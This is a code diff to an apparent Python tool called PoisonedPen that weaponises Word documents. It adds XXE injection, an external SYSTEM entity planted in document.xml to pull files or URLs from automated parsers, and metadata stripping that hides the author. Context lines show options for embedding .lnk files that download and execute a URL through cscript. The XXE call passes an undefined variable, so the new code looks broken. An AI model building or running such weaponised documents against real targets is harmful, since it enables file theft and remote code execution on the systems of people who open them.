@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-import argparse, os, sys, tempfile, shutil, binascii, olefile, pyemf
+import re, argparse, os, sys, tempfile, shutil, binascii, olefile, pyemf
 from docx import Document
 from lxml import etree
 from zipfile import ZipFile
@@ -191,6 +191,25 @@ class PoisonedPen:
 
     # Insert into document
 
+  # Strip author info out
+  def sanitise( self ):
+    print 'Stripping creator and lastModifiedBy metadata...'
+    elements = ['dc:creator','cp:lastModifiedBy']
+    props = 'docProps/core.xml'
+    xml = self.get_xml( props )
+    for el in elements:
+      xml = re.sub( '<'+el+'>[^<]+</'+el+'>', '<'+el+'></'+el+'>', xml )
+    self.contents.update( {props: xml} )
+
+  # Insert XXE into document xml
+  def insert_xxe( self, path ):
+    doc = 'word/document.xml'
+    print 'Inserting XXE SYSTEM element pointing to ' + path + ' into '+doc+'. This will almost certainly prevent it from opening in any MS Office editing software...'
+    xml = self.get_xml( doc )
+    xml = re.sub( '(<?xml[^>]+>)', '\1<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "'+path+'" >]><foo>&xxe;</foo>', xml )
+    self.contents.update( { doc: xml } )
+  
+
 def main():
   
   newsuffix = '-FINAL'
@@ -201,13 +220,14 @@ def main():
   parser.add_argument("-o", "--ole-file", metavar="FILEPATH", help="Insert a file from the filesystem as an OLE object" )
   parser.add_argument("-l", "--ole-lnk", metavar="URLORPATH", help="Insert a .lnk file as an OLE object to the specified URL / path" )
   parser.add_argument("-d", "--ole-dlexec", metavar="URL", help="Insert a .lnk file which downloads and executes the specified URL using c:\Windows\System32\cscript" )
-  parser.add_argument("-r", "--replace", action="store_true", help="Replace a file in place instead of created a new one and appending '"+newsuffix+".docx' to the file name" )
+  parser.add_argument("-r", "--replace", action="store_true", help="Replace a file in place instead of creating a new one and appending '"+newsuffix+".docx' to the file name" )
   parser.add_argument("-s", "--suffix", help="Suffix to use instead of '"+newsuffix+"' (extension is always preserved)" )
   parser.add_argument("-i", "--icon", help="Icon to use when embedding an OLE object", choices=['word','excel'], default='word' )
   parser.add_argument("-c", "--caption", help="Caption to write next to file icon (i.e. the file name)", default='Attachment.docx' )
+  parser.add_argument("--sanitise", action="store_true", help="Strip identifiable information (author, last modified) from document" )
+  parser.add_argument("-x", "--xxe", help="Insert XXE SYSTEM element into the document which fetches this path/URL and displays it inline. WARNING - will break Word parsing - use only against automated parsers" )
 
   # TODO
-  # parser.add_argument("-x", "--xxe", help="Insert XXE SYSTEM element into the document which fetches this path/URL and displays it inline. WARNING - will break Word parsing - use only against automated parsers" )
   # parser.add_argument("-t", "--template", help="Insert the URL of a template to download as the document opens (e.g. UNC path)" )
   parser.add_argument("documents", nargs="+", help="The word file(s) to poison (supports wildcards)")
   if len( sys.argv)==1:
@@ -237,7 +257,12 @@ def main():
 
     if args.ole_dlexec:
       doc.insert_ole_dlexec_lnk( args.ole_dlexec, args.icon, args.caption )
-    
+  
+    if args.sanitise:
+      doc.sanitise()
+  
+    if args.xxe:
+      doc.insert_xxe(path)
 
     doc.save()
 
